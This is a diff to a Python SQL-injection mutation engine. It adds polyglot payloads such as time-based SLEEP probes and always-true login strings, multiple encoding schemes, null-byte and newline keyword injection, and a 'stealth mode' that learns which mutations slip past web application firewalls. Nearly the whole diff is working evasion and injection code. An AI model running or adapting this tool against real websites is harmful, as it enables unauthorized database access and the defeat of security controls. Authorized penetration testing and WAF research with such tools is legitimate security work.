@@ -11,7 +11,9 @@ class ASTMutator:
             "union_balance": self._balance_union_columns,
             "junk_fill": self._junk_filling,
             "context_aware": self._context_aware_mutation,
-            "directed_bypass": self._directed_keyword_mutation
+            "directed_bypass": self._directed_keyword_mutation,
+            "polyglot": self._polyglot_mutation,
+            "encoding": self._encoding_mutation
         }
         # Awareness: Track success of each strategy
         self.strategy_weights = {name: 1.0 for name in self.strategies.keys()}
@@ -19,31 +21,56 @@ class ASTMutator:
         self.keyword_reputation = {kw: 1.0 for kw in self.sql_keywords}
         self.last_strategy_used = None
         self.stealth_mode = False
+        self.blocked_chars = []
+        self.latency_history = []
+        self.success_dna = [] # Store sequences of mutations that worked
 
     def apply_hint(self, hint):
-        """Applies AI-driven hints to strategy weights."""
-        strategy = hint.get("strategy")
-        if strategy in self.strategy_weights:
-            self.strategy_weights[strategy] *= 5.0
-            print(f"[*] Mutator: AI Hint Applied - Boosting {strategy}", flush=True)
-        
+        """Applies AI-driven or WAF-driven hints to mutation logic."""
+        weights = hint.get("weights", {})
+        for strat, weight in weights.items():
+            if strat in self.strategy_weights:
+                self.strategy_weights[strat] *= weight
+                print(f"[*] Mutator: Boosting strategy {strat} by {weight}x", flush=True)
+
         # Keyword specific hints
         target_kw = hint.get("target_keyword")
         if target_kw in self.keyword_reputation:
             self.keyword_reputation[target_kw] = 0.1 # Force bypass for this keyword
             print(f"[*] Mutator: AI Hint Applied - Flagging {target_kw} for bypass", flush=True)
 
-    def mutate(self, payload, error_msg=None, intensity=1):
+        # WAF specific blocked characters
+        blocked = hint.get("blocked_chars", [])
+        if blocked:
+            self.blocked_chars = list(set(self.blocked_chars + blocked))
+            print(f"[*] Mutator: WAF Adaptation - Avoiding blocked chars: {self.blocked_chars}", flush=True)
+
+    def mutate(self, payload, error_msg=None, intensity=1, response_time=None):
         mutated = str(payload)
         
-        # 1. Error-Based Feedback: Apply specific fixes based on SQL error
+        # 0. Dynamic Intensity Adjustment
+        if response_time:
+            self.latency_history.append(response_time)
+            if len(self.latency_history) > 5:
+                avg_latency = sum(self.latency_history[-5:]) / 5
+                if response_time > avg_latency * 1.5:
+                    print(f"[*] Mutator: Latency spike detected ({response_time:.2f}s). Increasing mutation intensity.", flush=True)
+                    intensity += 1
+        
+        # 1. WAF-Specific Character Replacement
+        if " " in self.blocked_chars:
+            separators = ["/**/", "/*!*/", "+", "%20", "%0A"]
+            mutated = mutated.replace(" ", random.choice(separators))
+        
+        # 2. Error-Based Feedback: Apply specific fixes based on SQL error
         if error_msg:
             mutated = self._apply_error_feedback(mutated, error_msg)
+            intensity += 1 # Errors often mean we are close, increase intensity to find the fix
             
-        # 2. Context-Aware Mutation: Detect and wrap payload if needed
+        # 3. Context-Aware Mutation: Detect and wrap payload if needed
         mutated = self._context_aware_wrap(mutated)
         
-        # 3. Standard Mutations with Weighted Selection
+        # 4. Standard Mutations with Weighted Selection
         num_mutations = random.randint(1, 2) * intensity
         
         # Awareness: If in stealth mode, favor stealthy strategies
@@ -52,6 +79,7 @@ class ASTMutator:
             current_weights["context_aware"] *= 2.0
             current_weights["inline_comments"] *= 2.0
             current_weights["directed_bypass"] *= 3.0
+            current_weights["polyglot"] *= 2.0
             print("[*] Stealth Mode Active: Prioritizing evasive mutations.", flush=True)
 
         for _ in range(num_mutations):
@@ -65,8 +93,11 @@ class ASTMutator:
             
         return mutated
 
-    def report_success(self, payload, score):
+    def report_success(self, payload, score, strategy_used=None):
         """Gene Credit Assignment: Update strategy and keyword reputation based on score."""
+        if not strategy_used:
+            strategy_used = self.last_strategy_used
+
         # Detect if we are being blocked consistently
         if score <= 0.1:
             self.stealth_mode = True
@@ -84,14 +115,45 @@ class ASTMutator:
                         self.keyword_reputation[kw] += 0.05
                         self.keyword_reputation[kw] = min(2.0, self.keyword_reputation[kw])
 
-        if self.last_strategy_used and score > 0.5:
+        if strategy_used and score > 0.5:
             # Reward the strategy
-            self.strategy_weights[self.last_strategy_used] += 0.1
+            self.strategy_weights[strategy_used] += 0.2 # Increased reward for feedback loop
+            
+            # If it's a very high score, store this as "Success DNA"
+            if score >= 0.9:
+                self.success_dna.append(strategy_used)
+                if len(self.success_dna) > 10: self.success_dna.pop(0)
+
             # Normalize to prevent runaway weights
             total = sum(self.strategy_weights.values())
             for k in self.strategy_weights:
                 self.strategy_weights[k] /= total
                 self.strategy_weights[k] *= len(self.strategy_weights) # Keep average at 1.0
+
+    def _polyglot_mutation(self, payload):
+        """Creates a polyglot payload that works in multiple contexts."""
+        polyglots = [
+            f"SLEEP(5) /*' or SLEEP(5) or '\" or SLEEP(5) or \"*/",
+            f"1'\"--",
+            f"')) OR 1=1--",
+            f"\" OR 1=1--",
+            f"admin' or '1'='1'--"
+        ]
+        if random.random() < 0.3:
+            return random.choice(polyglots)
+        
+        # Wrap existing payload in a polyglot shell
+        return f"1' OR ({payload}) OR '1'='1"
+
+    def _encoding_mutation(self, payload):
+        """Applies various encoding techniques."""
+        encodings = [
+            lambda p: "".join([f"%{ord(c):02X}" for c in p]), # Full URL Encode
+            lambda p: "".join([f"\\x{ord(c):02x}" for c in p]), # Hex Encode
+            lambda p: p.replace(" ", "%20").replace("'", "%27").replace("\"", "%22"), # Selective URL Encode
+            lambda p: "".join([f"&#{ord(c)};" for c in p]) # HTML Entity Encode
+        ]
+        return random.choice(encodings)(payload)
 
     def _directed_keyword_mutation(self, payload):
         """Directed Mutations: Apply bypasses to keywords based on their reputation."""
@@ -187,24 +249,34 @@ class ASTMutator:
         elif self.context == "DOUBLE_QUOTE" and not mutated.startswith('"'):
             mutated = '"' + mutated
 
-        # 1. Quote Alteration: Swap quotes
+        # 1. Quote Alteration & Escaping Variations
         if "'" in mutated:
-            if random.random() < 0.4:
-                mutated = mutated.replace("'", '"')
+            options = [
+                lambda p: p.replace("'", "''"), # SQL Escape
+                lambda p: p.replace("'", "\\'"), # C-Style Escape
+                lambda p: p.replace("'", "%27"), # URL Encode
+                lambda p: p.replace("'", '"')    # Swap to Double
+            ]
+            mutated = random.choice(options)(mutated)
 
-        # 2. Comment Wrapping: Wrap keywords or parts of the payload
+        # 2. Advanced Comment Wrapping & Nested Structures
         keywords = ["SELECT", "UNION", "FROM", "WHERE", "AND", "OR", "ORDER", "BY"]
         for kw in keywords:
             if re.search(rf'\b{kw}\b', mutated, re.IGNORECASE):
                 coin = random.random()
-                if coin < 0.3:
-                    mutated = re.sub(rf'\b{kw}\b', f"/**/{kw}/**/", mutated, flags=re.IGNORECASE)
+                if coin < 0.2:
+                    # Nested comments: /*!50000/*bypass*/SELECT*/
+                    mutated = re.sub(rf'\b{kw}\b', f"/*!50000/*bypass*/{kw}*/", mutated, flags=re.IGNORECASE)
+                elif coin < 0.4:
+                    # Newline injection: SELECT\nFROM
+                    mutated = re.sub(rf'\b{kw}\b', f"{kw}\n", mutated, flags=re.IGNORECASE)
                 elif coin < 0.6:
-                    mutated = re.sub(rf'\b{kw}\b', f"/*!{kw}*/", mutated, flags=re.IGNORECASE)
+                    # Null byte injection (if supported/needed)
+                    mutated = re.sub(rf'\b{kw}\b', f"{kw}%00", mutated, flags=re.IGNORECASE)
 
-        # 3. Space/Separator Mutation
+        # 3. Space/Separator Mutation (Advanced)
         if " " in mutated:
-            separators = ["/**/", "/*!*/", "+"]
+            separators = ["/**/", "/*!*/", "+", "%0A", "%0D", "%09", "/*\n*/"]
             sep = random.choice(separators)
             mutated = mutated.replace(" ", sep)
 
